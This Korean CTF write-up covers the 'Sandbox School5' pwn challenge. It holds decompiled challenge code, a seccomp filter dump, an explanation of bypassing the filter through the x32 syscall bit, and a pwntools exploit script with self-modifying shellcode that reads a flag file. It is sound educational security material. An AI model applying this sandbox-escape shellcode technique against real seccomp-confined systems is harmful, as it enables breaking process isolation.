---
title: "2018 TenDollar CTF Sandbox School5"
date: 2020-2-13
ctf: TenDollar CTF
layout: post
published : false
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  signed int i; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( buf == -1LL )
  {
    puts("[err] Please, let me know this issue (hackability@naver.com)");
    result = -1;
  }
  else
  {
    puts("[*] Welcome to sandbox school for beginner!");
    puts("[*] Put your shellcode as binary stream. I'll ready for your input as read(0, shellcode, 1024)");
    puts("[*] Lv   : Troll");
    puts("[*] Desc : Now, you can't see me.");
    printf("> ", 4096LL);
    alarm(0xAu);
    read(0, buf, 0x400uLL);
    for ( i = 0; i <= 1022; ++i )
    {
      if ( *(buf + i) == 15 && *(buf + i + 1) == 5 )
      {
        puts("[*] blocked !");
        return -1;
      }
    }
    install_syscall_filter(0LL, buf);
    (buf)();
    result = 0;
  }
  return result;
}
```

필터링은 이렇게 걸려있다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0022
 0021: 0x06 0x00 0x00 0x00000000  return KILL
 0022: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0024
 0023: 0x06 0x00 0x00 0x00000000  return KILL
 0024: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

원하는 시스콜과 0x40000000을 더해주면 사용할 수 있다. syscall 처리하는거보면 32비트로 처리하는데 __X32_SYSCALL_BIT과 syscall number와 더해서 원하는 syscall을 부를 수 있다.

```
#define __X32_SYSCALL_BIT 0x40000000
#ifndef _ASM_X86_UNISTD_X32_H
#define _ASM_X86_UNISTD_X32_H 1
#define __NR_read (__X32_SYSCALL_BIT + 0)
#define __NR_write (__X32_SYSCALL_BIT + 1)
#define __NR_open (__X32_SYSCALL_BIT + 2)
#define __NR_close (__X32_SYSCALL_BIT + 3)
#define __NR_stat (__X32_SYSCALL_BIT + 4)
#define __NR_fstat (__X32_SYSCALL_BIT + 5)
#define __NR_lstat (__X32_SYSCALL_BIT + 6)
#define __NR_poll (__X32_SYSCALL_BIT + 7)
#define __NR_lseek (__X32_SYSCALL_BIT + 8)
#define __NR_mmap (__X32_SYSCALL_BIT + 9)
#define __NR_mprotect (__X32_SYSCALL_BIT + 10)
```

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
e = ELF('./sb5')
p = process('./sb5')

__X32_SYSCALL_BIT = 0x40000000
execute = 0x0000000000400B26

s = '''
movabs rax, 0x000067616c662f2e
push rax
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 2
or rax, 0x40000000
xor word ptr[rip], 0x959f
nop
nop

add rsp, 3000

mov rdi, rax
xor rax, rax
mov rsi, rsp
mov rdx, 100
or rax, 0x40000000
xor word ptr[rip], 0x959f
nop
nop

mov rax, 1
or rax, 0x40000000
mov rdi, 1
xor word ptr[rip], 0x959f
nop
nop
'''

#raw_input()
p.sendafter('>',asm(s))

p.interactive()
```

